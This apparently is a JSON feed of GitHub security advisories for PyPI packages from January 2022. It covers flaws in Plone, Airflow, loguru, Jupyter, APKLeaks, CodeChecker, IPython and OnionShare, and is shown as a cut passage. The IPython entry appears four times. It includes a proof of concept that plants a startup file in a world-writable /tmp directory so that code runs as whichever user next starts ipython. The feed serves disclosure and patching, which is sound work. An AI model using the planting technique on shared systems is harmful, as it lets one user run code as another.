{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Plone is vulnerable to reflected cross site scripting and open redirect when an attacker can get a compromised version of the image_view_fullscreen page in a cache, for example in Varnish.\nThe technique is known as cache poisoning.\nAny later visitor can get redirected when clicking on a link on this page.\nUsually only anonymous users are affected, but this depends on your cache settings.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A new version 3.0.6 of Products.ATContentTypes has been released with a fix.\nThis version works on Plone 5.2 (Python 2 only) and will be included in Plone 5.2.7.</p>\n<p>Note that the Products.CMFPlone package has the same problem in the 4.3 series.\n<code>plone.app.contenttypes</code> has the same problem in all versions, see <a href=\"https://github.com/plone/plone.app.contenttypes/security/advisories/GHSA-f7qw-5fgj-247x\">advisory</a>.\nFor all unpatched versions of the three packages, you can use the following workaround.</p>\n<h3 id=\"workaround\">Workaround</h3>\n<p>Make sure the image_view_fullscreen page is not stored in the cache.\nIn Plone:</p>\n<ul>\n<li>Login as Manager and go to Site Setup.</li>\n<li>Go to the 'Caching' control panel. If this does not exist, or 'Enable caching' is not checked, you should normally not be vulnerable.</li>\n<li>Click on the tab 'Caching operations'.</li>\n<li>Under 'Legacy template mappings' locate the ruleset 'Content item view'.</li>\n<li>From the last column ('Templates')  remove 'image_view_fullscreen'.</li>\n<li>Click on Save.</li>\n</ul>\n<h3 id=\"reporter\">Reporter</h3>\n<p>This vulnerability was responsibly disclosed to the Plone Security Team by Gustav Hansen, F-Secure Consulting. Thank you!</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, email us at <a href=\"mailto:security@plone.org\">security@plone.org</a>\nThis is also the correct address to use when you want to report a possible vulnerability.\nSee <a href=\"https://plone.org/security/report\">our security report policy</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/plone/Products.ATContentTypes/security/advisories/GHSA-g4c2-ghfg-g5rh\">https://github.com/plone/Products.ATContentTypes/security/advisories/GHSA-g4c2-ghfg-g5rh</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g4c2-ghfg-g5rh\">https://github.com/advisories/GHSA-g4c2-ghfg-g5rh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g4c2-ghfg-g5rh",
            "title": "[Products.ATContentTypes] Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') and URL Redirection to Untrusted Site ('Open Redirect') in Products.ATContentTypes",
            "date_modified": "2022-01-28T23:10:37.000Z",
            "date_published": "2022-01-28T23:10:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g4c2-ghfg-g5rh"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Plone is vulnerable to reflected cross site scripting and open redirect when an attacker can get a compromised version of the image_view_fullscreen page in a cache, for example in Varnish.\nThe technique is known as cache poisoning.\nAny later visitor can get redirected when clicking on a link on this page.\nUsually only anonymous users are affected, but this depends on your cache settings.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>No patch is available for the Products.CMFPlone 4 series.\nVersions 5.0 and higher are not affected, but two other packages used by these versions are affected.</p>\n<p><code>plone.app.contenttypes</code> has the same problem in all versions, see <a href=\"https://github.com/plone/plone.app.contenttypes/security/advisories/GHSA-f7qw-5fgj-247x\">advisory</a>.\nIn Plone 5.0-5.2, the default Products.ATContentTypes version has the same problem. See <a href=\"https://github.com/plone/Products.ATContentTypes/security/advisories/GHSA-g4c2-ghfg-g5rh\">advisory</a>.\nPlone 5.2.7 and 6.0.0a3 will be released today and will include these fixes.</p>\n<p>For all unpatched versions of the three packages, you can use the following workaround.</p>\n<h3 id=\"workaround\">Workaround</h3>\n<p>Make sure the image_view_fullscreen page is not stored in the cache.\nIn Plone:</p>\n<ul>\n<li>Login as Manager and go to Site Setup.</li>\n<li>Go to the 'Caching' control panel. If this does not exist, or 'Enable caching' is not checked, you should normally not be vulnerable.</li>\n<li>Click on the tab 'Caching operations'.</li>\n<li>Under 'Legacy template mappings' locate the ruleset 'Content item view'.</li>\n<li>From the last column ('Templates')  remove 'image_view_fullscreen'.</li>\n<li>Click on Save.</li>\n</ul>\n<h3 id=\"reporter\">Reporter</h3>\n<p>This vulnerability was responsibly disclosed to the Plone Security Team by Gustav Hansen, F-Secure Consulting. Thank you!</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, email us at <a href=\"mailto:security@plone.org\">security@plone.org</a>\nThis is also the correct address to use when you want to report a possible vulnerability.\nSee <a href=\"https://plone.org/security/report\">our security report policy</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/plone/Products.CMFPlone/security/advisories/GHSA-8w54-22w9-3g8f\">https://github.com/plone/Products.CMFPlone/security/advisories/GHSA-8w54-22w9-3g8f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8w54-22w9-3g8f\">https://github.com/advisories/GHSA-8w54-22w9-3g8f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8w54-22w9-3g8f",
            "title": "[Products.CMFPlone] Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') and URL Redirection to Untrusted Site ('Open Redirect') in Products.CMFPlone",
            "date_modified": "2022-01-28T23:10:40.000Z",
            "date_published": "2022-01-28T23:10:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8w54-22w9-3g8f"
            }
        },
        {
            "content_html": "<p>In Apache Airflow prior to 2.2.0. This CVE applies to a specific case where a User who has \"can_create\" permissions on DAG Runs can create Dag Runs for dags that they don't have \"edit\" permissions for.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-45230\">https://nvd.nist.gov/vuln/detail/CVE-2021-45230</a></li>\n<li><a href=\"https://lists.apache.org/thread/m778ojn0k595rwco4ht9wjql89mjoxnl\">https://lists.apache.org/thread/m778ojn0k595rwco4ht9wjql89mjoxnl</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4jh2-3c85-q67h\">https://github.com/advisories/GHSA-4jh2-3c85-q67h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4jh2-3c85-q67h",
            "title": "[apache-airflow] Improper Privilege Management in apache-airflow",
            "date_modified": "2022-01-28T21:55:34.000Z",
            "date_published": "2022-01-28T21:55:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4jh2-3c85-q67h"
            }
        },
        {
            "content_html": "<p>In versions of loguru up to and including 0.5.3 a lack of sanitization on log serialization can lead to arbitrary code execution. The maintainer disputes the issue, but has altered behavior of the library in commit 4b0070a4f30cbf6d5e12e6274b242b62ea11c81b. See <a href=\"https://github.com/Delgan/loguru/issues/563\">https://github.com/Delgan/loguru/issues/563</a> for further discussion of the issue. The function in question is intended for internal use only, but is not restricted. At time of writing no update has yet been published to PyPi.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-0329\">https://nvd.nist.gov/vuln/detail/CVE-2022-0329</a></li>\n<li><a href=\"https://github.com/delgan/loguru/commit/4b0070a4f30cbf6d5e12e6274b242b62ea11c81b\">https://github.com/delgan/loguru/commit/4b0070a4f30cbf6d5e12e6274b242b62ea11c81b</a></li>\n<li><a href=\"https://huntr.dev/bounties/1-pypi-loguru\">https://huntr.dev/bounties/1-pypi-loguru</a></li>\n<li><a href=\"https://github.com/Delgan/loguru/issues/563\">https://github.com/Delgan/loguru/issues/563</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cvp7-c586-cmf4\">https://github.com/advisories/GHSA-cvp7-c586-cmf4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cvp7-c586-cmf4",
            "title": "[loguru] Code Injection in loguru",
            "date_modified": "2022-01-28T22:01:45.000Z",
            "date_published": "2022-01-28T22:01:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cvp7-c586-cmf4"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><strong>What kind of vulnerability is it?</strong>  Server-Side Request Forgery ( SSRF )</p>\n<p><strong>Who is impacted?</strong> Any user deploying Jupyter Server or Notebook with jupyter-proxy-server extension enabled. </p>\n<p>A lack of input validation allowed authenticated clients to proxy requests to other hosts, bypassing the <code>allowed_hosts</code> check. Because authentication is required, which already grants permissions to make the same requests via kernel or terminal execution, this is considered low to moderate severity.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>Upgrade to 3.2.1, or apply the patch <a href=\"https://github.com/jupyterhub/jupyter-server-proxy/compare/v3.2.0...v3.2.1.patch\">https://github.com/jupyterhub/jupyter-server-proxy/compare/v3.2.0...v3.2.1.patch</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open a topic <a href=\"https://discourse.jupyter.org\">on our forum</a></li>\n<li>Email the Jupyter security team at <a href=\"mailto:security@ipython.org\">security@ipython.org</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-gcv9-6737-pjqw\">https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-gcv9-6737-pjqw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21697\">https://nvd.nist.gov/vuln/detail/CVE-2022-21697</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/commit/fd31930bacd12188c448c886e0783529436b99eb\">https://github.com/jupyterhub/jupyter-server-proxy/commit/fd31930bacd12188c448c886e0783529436b99eb</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/compare/v3.2.0...v3.2.1.patch\">https://github.com/jupyterhub/jupyter-server-proxy/compare/v3.2.0...v3.2.1.patch</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gcv9-6737-pjqw\">https://github.com/advisories/GHSA-gcv9-6737-pjqw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gcv9-6737-pjqw",
            "title": "[jupyter-server-proxy] SSRF vulnerability in jupyter-server-proxy",
            "date_modified": "2022-01-27T16:24:26.000Z",
            "date_published": "2022-01-27T16:24:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gcv9-6737-pjqw"
            }
        },
        {
            "content_html": "<p>APKLeaks prior to v2.0.4 allows remote authenticated attackers to execute arbitrary OS commands via package name inside application manifest.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker could include arguments that allow unintended commands or code to be executed, allow sensitive data to be read or modified or could cause other unintended behavior through malicious package name.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem is fixed in version v2.0.4 and above.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<pre><code class=\"language-bash\">&gt; git fetch --tags; git checkout v2.0.6-dev\n</code></pre>\n<p>Or pull to the latest version:</p>\n<pre><code class=\"language-bash\">&gt; git pull origin master\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>a966e781499ff6fd4eea66876d7532301b13a382</li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Email me at <a href=\"mailto:me@dw1.io\">me@dw1.io</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dwisiswant0/apkleaks/security/advisories/GHSA-8434-v7xw-8m9x\">https://github.com/dwisiswant0/apkleaks/security/advisories/GHSA-8434-v7xw-8m9x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-21386\">https://nvd.nist.gov/vuln/detail/CVE-2021-21386</a></li>\n<li><a href=\"https://github.com/dwisiswant0/apkleaks/commit/a966e781499ff6fd4eea66876d7532301b13a382\">https://github.com/dwisiswant0/apkleaks/commit/a966e781499ff6fd4eea66876d7532301b13a382</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8434-v7xw-8m9x\">https://github.com/advisories/GHSA-8434-v7xw-8m9x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8434-v7xw-8m9x",
            "title": "[APKLeaks] Improper Neutralization of Argument Delimiters in a Decompiling Package Process in APKLeaks",
            "date_modified": "2022-01-21T23:03:39.000Z",
            "date_published": "2022-01-21T23:03:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8434-v7xw-8m9x"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Due to a sudden upstream breaking change by Bitly, versions of <code>bitlyshortener</code> &lt;0.6.0 generate invalid short URLs. All users are affected and must update immediately.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrading <code>bitlyshortener</code> to 0.6.0 or newer will prevent the generation such invalid short URLs.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>A workaround is to replace \"<a href=\"https://j.mp/&quot;\">https://j.mp/\"</a> in each generated short URL with \"<a href=\"https://bit.ly/&quot;\">https://bit.ly/\"</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/impredicative/bitlyshortener/releases\">Release notes</a><h3 id=\"references-1\">References</h3>\n</li>\n</ul>\n<ul>\n<li><a href=\"https://github.com/impredicative/bitlyshortener/security/advisories/GHSA-rcrv-228c-gprj\">https://github.com/impredicative/bitlyshortener/security/advisories/GHSA-rcrv-228c-gprj</a></li>\n<li><a href=\"https://github.com/impredicative/bitlyshortener/commit/b307d70bedf745305fa0dd3c5c600d8cb88d09b5\">https://github.com/impredicative/bitlyshortener/commit/b307d70bedf745305fa0dd3c5c600d8cb88d09b5</a></li>\n<li><a href=\"https://github.com/impredicative/bitlyshortener/releases/tag/0.6.0\">https://github.com/impredicative/bitlyshortener/releases/tag/0.6.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rcrv-228c-gprj\">https://github.com/advisories/GHSA-rcrv-228c-gprj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rcrv-228c-gprj",
            "title": "[bitlyshortener] Invalid URL generation in bitlyshortener",
            "date_modified": "2022-01-21T18:39:40.000Z",
            "date_published": "2022-01-21T18:39:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rcrv-228c-gprj"
            }
        },
        {
            "content_html": "<p>In Ericsson CodeChecker prior to 6.18.2, a Stored Cross-site scripting (XSS) vulnerability in the comments component of the reports viewer allows remote attackers to inject arbitrary web script or HTML via the POST JSON data of the /CodeCheckerService API.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-44217\">https://nvd.nist.gov/vuln/detail/CVE-2021-44217</a></li>\n<li><a href=\"https://github.com/Ericsson/codechecker/pull/3549\">https://github.com/Ericsson/codechecker/pull/3549</a></li>\n<li><a href=\"https://codechecker-demo.eastus.cloudapp.azure.com/\">https://codechecker-demo.eastus.cloudapp.azure.com/</a></li>\n<li><a href=\"https://github.com/Hyperkopite/CVE-2021-44217/blob/main/README.md\">https://github.com/Hyperkopite/CVE-2021-44217/blob/main/README.md</a></li>\n<li><a href=\"https://user-images.githubusercontent.com/9525971/142965091-e118b012-a7fc-4c2f-ad0c-80aeed6f7ec9.png\">https://user-images.githubusercontent.com/9525971/142965091-e118b012-a7fc-4c2f-ad0c-80aeed6f7ec9.png</a></li>\n<li><a href=\"https://github.com/Ericsson/codechecker/commit/72ee51158e6d81150320223b85410c179b9ee2b1\">https://github.com/Ericsson/codechecker/commit/72ee51158e6d81150320223b85410c179b9ee2b1</a></li>\n<li><a href=\"https://github.com/Ericsson/codechecker/releases/tag/v6.18.2\">https://github.com/Ericsson/codechecker/releases/tag/v6.18.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fxmx-pfm2-85m2\">https://github.com/advisories/GHSA-fxmx-pfm2-85m2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fxmx-pfm2-85m2",
            "title": "[codechecker] Cross-site Scripting in Ericsson CodeChecker",
            "date_modified": "2022-01-21T23:32:32.000Z",
            "date_published": "2022-01-21T23:32:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fxmx-pfm2-85m2"
            }
        },
        {
            "content_html": "<p>We’d like to disclose an arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another.</p>\n<p>Proof of concept</p>\n<p>User1:</p>\n<pre><code>mkdir -m 777 /tmp/profile_default\nmkdir -m 777 /tmp/profile_default/startup\necho 'print(\"stealing your private secrets\")' &gt; /tmp/profile_default/startup/foo.py\n</code></pre>\n<p>User2:</p>\n<pre><code>cd /tmp\nipython\n</code></pre>\n<p>User2 will see:</p>\n<pre><code>Python 3.9.7 (default, Oct 25 2021, 01:04:21)\nType 'copyright', 'credits' or 'license' for more information\nIPython 7.29.0 -- An enhanced Interactive Python. Type '?' for help.\nstealing your private secrets\n</code></pre>\n<h2 id=\"patched-release-and-documentation\">Patched release and documentation</h2>\n<p>See <a href=\"https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699\">https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699</a>, </p>\n<p>Version 8.0.1, 7.31.1 for current Python version are recommended. \nVersion 7.16.3 has also been published for Python 3.6 users, \nVersion 5.11 (source only, 5.x branch on github) for older Python versions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x\">https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x</a></li>\n<li><a href=\"https://github.com/ipython/ipython/commit/46a51ed69cdf41b4333943d9ceeb945c4ede5668\">https://github.com/ipython/ipython/commit/46a51ed69cdf41b4333943d9ceeb945c4ede5668</a></li>\n<li><a href=\"https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699\">https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21699\">https://nvd.nist.gov/vuln/detail/CVE-2022-21699</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2022/01/msg00021.html\">https://lists.debian.org/debian-lts-announce/2022/01/msg00021.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pq7m-3gw7-gq5x\">https://github.com/advisories/GHSA-pq7m-3gw7-gq5x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pq7m-3gw7-gq5x",
            "title": "[ipython] Execution with Unnecessary Privileges in ipython",
            "date_modified": "2022-01-27T18:31:13.000Z",
            "date_published": "2022-01-21T18:55:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pq7m-3gw7-gq5x"
            }
        },
        {
            "content_html": "<p>We’d like to disclose an arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another.</p>\n<p>Proof of concept</p>\n<p>User1:</p>\n<pre><code>mkdir -m 777 /tmp/profile_default\nmkdir -m 777 /tmp/profile_default/startup\necho 'print(\"stealing your private secrets\")' &gt; /tmp/profile_default/startup/foo.py\n</code></pre>\n<p>User2:</p>\n<pre><code>cd /tmp\nipython\n</code></pre>\n<p>User2 will see:</p>\n<pre><code>Python 3.9.7 (default, Oct 25 2021, 01:04:21)\nType 'copyright', 'credits' or 'license' for more information\nIPython 7.29.0 -- An enhanced Interactive Python. Type '?' for help.\nstealing your private secrets\n</code></pre>\n<h2 id=\"patched-release-and-documentation\">Patched release and documentation</h2>\n<p>See <a href=\"https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699\">https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699</a>, </p>\n<p>Version 8.0.1, 7.31.1 for current Python version are recommended. \nVersion 7.16.3 has also been published for Python 3.6 users, \nVersion 5.11 (source only, 5.x branch on github) for older Python versions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x\">https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x</a></li>\n<li><a href=\"https://github.com/ipython/ipython/commit/46a51ed69cdf41b4333943d9ceeb945c4ede5668\">https://github.com/ipython/ipython/commit/46a51ed69cdf41b4333943d9ceeb945c4ede5668</a></li>\n<li><a href=\"https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699\">https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21699\">https://nvd.nist.gov/vuln/detail/CVE-2022-21699</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2022/01/msg00021.html\">https://lists.debian.org/debian-lts-announce/2022/01/msg00021.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pq7m-3gw7-gq5x\">https://github.com/advisories/GHSA-pq7m-3gw7-gq5x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pq7m-3gw7-gq5x",
            "title": "[ipython] Execution with Unnecessary Privileges in ipython",
            "date_modified": "2022-01-27T18:31:13.000Z",
            "date_published": "2022-01-21T18:55:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pq7m-3gw7-gq5x"
            }
        },
        {
            "content_html": "<p>We’d like to disclose an arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another.</p>\n<p>Proof of concept</p>\n<p>User1:</p>\n<pre><code>mkdir -m 777 /tmp/profile_default\nmkdir -m 777 /tmp/profile_default/startup\necho 'print(\"stealing your private secrets\")' &gt; /tmp/profile_default/startup/foo.py\n</code></pre>\n<p>User2:</p>\n<pre><code>cd /tmp\nipython\n</code></pre>\n<p>User2 will see:</p>\n<pre><code>Python 3.9.7 (default, Oct 25 2021, 01:04:21)\nType 'copyright', 'credits' or 'license' for more information\nIPython 7.29.0 -- An enhanced Interactive Python. Type '?' for help.\nstealing your private secrets\n</code></pre>\n<h2 id=\"patched-release-and-documentation\">Patched release and documentation</h2>\n<p>See <a href=\"https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699\">https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699</a>, </p>\n<p>Version 8.0.1, 7.31.1 for current Python version are recommended. \nVersion 7.16.3 has also been published for Python 3.6 users, \nVersion 5.11 (source only, 5.x branch on github) for older Python versions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x\">https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x</a></li>\n<li><a href=\"https://github.com/ipython/ipython/commit/46a51ed69cdf41b4333943d9ceeb945c4ede5668\">https://github.com/ipython/ipython/commit/46a51ed69cdf41b4333943d9ceeb945c4ede5668</a></li>\n<li><a href=\"https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699\">https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21699\">https://nvd.nist.gov/vuln/detail/CVE-2022-21699</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2022/01/msg00021.html\">https://lists.debian.org/debian-lts-announce/2022/01/msg00021.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pq7m-3gw7-gq5x\">https://github.com/advisories/GHSA-pq7m-3gw7-gq5x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pq7m-3gw7-gq5x",
            "title": "[ipython] Execution with Unnecessary Privileges in ipython",
            "date_modified": "2022-01-27T18:31:13.000Z",
            "date_published": "2022-01-21T18:55:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pq7m-3gw7-gq5x"
            }
        },
        {
            "content_html": "<p>We’d like to disclose an arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another.</p>\n<p>Proof of concept</p>\n<p>User1:</p>\n<pre><code>mkdir -m 777 /tmp/profile_default\nmkdir -m 777 /tmp/profile_default/startup\necho 'print(\"stealing your private secrets\")' &gt; /tmp/profile_default/startup/foo.py\n</code></pre>\n<p>User2:</p>\n<pre><code>cd /tmp\nipython\n</code></pre>\n<p>User2 will see:</p>\n<pre><code>Python 3.9.7 (default, Oct 25 2021, 01:04:21)\nType 'copyright', 'credits' or 'license' for more information\nIPython 7.29.0 -- An enhanced Interactive Python. Type '?' for help.\nstealing your private secrets\n</code></pre>\n<h2 id=\"patched-release-and-documentation\">Patched release and documentation</h2>\n<p>See <a href=\"https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699\">https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699</a>, </p>\n<p>Version 8.0.1, 7.31.1 for current Python version are recommended. \nVersion 7.16.3 has also been published for Python 3.6 users, \nVersion 5.11 (source only, 5.x branch on github) for older Python versions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x\">https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x</a></li>\n<li><a href=\"https://github.com/ipython/ipython/commit/46a51ed69cdf41b4333943d9ceeb945c4ede5668\">https://github.com/ipython/ipython/commit/46a51ed69cdf41b4333943d9ceeb945c4ede5668</a></li>\n<li><a href=\"https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699\">https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21699\">https://nvd.nist.gov/vuln/detail/CVE-2022-21699</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2022/01/msg00021.html\">https://lists.debian.org/debian-lts-announce/2022/01/msg00021.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pq7m-3gw7-gq5x\">https://github.com/advisories/GHSA-pq7m-3gw7-gq5x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pq7m-3gw7-gq5x",
            "title": "[ipython] Execution with Unnecessary Privileges in ipython",
            "date_modified": "2022-01-27T18:31:13.000Z",
            "date_published": "2022-01-21T18:55:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pq7m-3gw7-gq5x"
            }
        },
        {
            "content_html": "<p>Between September 26, 2021 and October 8, 2021, <a href=\"https://www.radicallyopensecurity.com/\">Radically Open Security</a> conducted a penetration test of OnionShare 2.4, funded by the Open Technology Fund's <a href=\"https://www.opentech.fund/labs/red-team-lab/\">Red Team lab</a>. This is an issue from that penetration test.</p>\n<ul>\n<li>Vulnerability ID: OTF-005</li>\n<li>Vulnerability type: Improper Input Sanitization</li>\n<li>Threat level: Low</li>\n</ul>\n<h2 id=\"description\">Description:</h2>\n<p>It is possible to change the username to that of another chat participant with an additional space character at the end of the name string.</p>\n<h2 id=\"technical-description\">Technical description:</h2>\n<p>Assumed users in Chat:</p>\n<ul>\n<li>Alice</li>\n<li>Bob</li>\n<li>Mallory</li>\n</ul>\n<ol>\n<li>Mallory renames to <code>Alice </code>.</li>\n<li>Mallory sends message as <code>Alice </code>.</li>\n<li>Alice and Bob receive a message from Mallory disguised as <code>Alice </code>, which is hard to distinguish from the <code>Alice</code>\nin the web interface.</li>\n</ol>\n<p><img alt=\"otf-005-a\" src=\"https://user-images.githubusercontent.com/156128/140666112-8febd4d8-6761-41aa-955c-48be76f3c657.png\">\n<img alt=\"otf-005-b\" src=\"https://user-images.githubusercontent.com/156128/140666113-1713ddf7-cef6-4dac-b718-9af1dc4ffdcd.png\"></p>\n<p>Other (invisible) whitespace characters were found to be working as well.</p>\n<h2 id=\"impact\">Impact:</h2>\n<p>An adversary with access to the chat environment can use the rename feature to impersonate other participants by adding whitespace characters at the end of the username.</p>\n<h2 id=\"recommendation\">Recommendation:</h2>\n<ul>\n<li><p>Remove non-visible characters from the username</p>\n<h3 id=\"references\">References</h3>\n</li>\n<li><p><a href=\"https://github.com/onionshare/onionshare/security/advisories/GHSA-68vr-8f46-vc9f\">https://github.com/onionshare/onionshare/security/advisories/GHSA-68vr-8f46-vc9f</a></p>\n</li>\n<li><p><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21696\">https://nvd.nist.gov/vuln/detail/CVE-2022-21696</a></p>\n</li>\n<li><p><a href=\"https://github.com/onionshare/onionshare/releases/tag/v2.5\">https://github.com/onionshare/onionshare/releases/tag/v2.5</a></p>\n</li>\n<li><p><a 